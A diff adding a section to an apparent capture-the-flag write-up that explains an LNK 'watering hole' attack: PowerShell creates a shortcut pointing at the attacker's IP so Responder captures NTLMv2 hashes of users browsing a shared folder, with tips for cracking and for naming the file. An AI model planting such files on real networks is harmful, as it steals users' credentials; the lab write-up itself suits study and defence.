@@ -247,3 +247,27 @@ We need to rethink 🤔 this machine and go back to the beginning :arrow_backwar
 
 ## watering hole attack
 
+Bearing this in mind, we can try a watering hole attack which is more often used to elevate privileges on a machine once a foothold has been obtained. I mean a *lnk file attack* in which we create a windows *lnk* file which points to our attacking machine. We then drop this into a directory which hopefully will receive lots of traffic - such as a shared directory :wink: - and wait with responder running to capture hashes of users who visit the poisoned directory - hence the name watering hole attack - we poison the waterhole and wait :water_buffalo:
+
+Typically we want admin or domain admin users to visit the poisoned directory so we can grab their *ntlmv2* hashes and attempt to crack :hammer: them offline using a tool such as *hashcat*
+
+One of the great things about a *lnk file attack* is that the victims do not need to click on the file - when it loads in file explorer it will send their hash flying in our direction :partying_face:
+
+Because of this, it is a good idea to name the malicious lnk file something beginning with *a* or even better @ or ~ since then it will be pulled to the top of the directory if the contents are listed alphabetically, and they usually are. I did not do this in this case as I didn't think it would be necessary, but it is worth bearing in mind.
+
+```powershell
+    $objShell = New-Object -ComObject WScript.shell
+    $lnk = $objShell.CreateShortcut("C:\app.lnk")
+    $lnk.TargetPath = "\\10.8.46.6\@app.png"
+    $lnk.WindowStyle = 1
+    $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+    $lnk.Description = "App"
+    $lnk.HotKey = "Ctrl+Alt+T"
+    $lnk.Save()
+```
+
+![wh1](/images/29.png)
+
+> [!IMPORTANT]
+> You will need to change `$lnk.TargetPath` so it points to your attacking machine IP address - the rest can be left as it is
+
